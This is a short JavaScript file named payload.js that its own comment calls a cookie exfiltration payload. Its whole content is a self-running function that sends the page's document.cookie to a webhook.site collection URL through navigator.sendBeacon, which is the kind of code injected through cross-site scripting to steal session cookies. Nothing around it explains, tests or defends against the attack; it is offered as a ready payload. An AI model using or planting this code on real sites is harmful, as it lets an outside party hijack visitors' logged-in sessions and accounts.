// payload.js — single-method (navigator.sendBeacon) exfil
(function(){
    navigator.sendBeacon('https://webhook.site/6ec5e230-6597-4847-8ab2-5baefc1a45f7', document.cookie);
})();
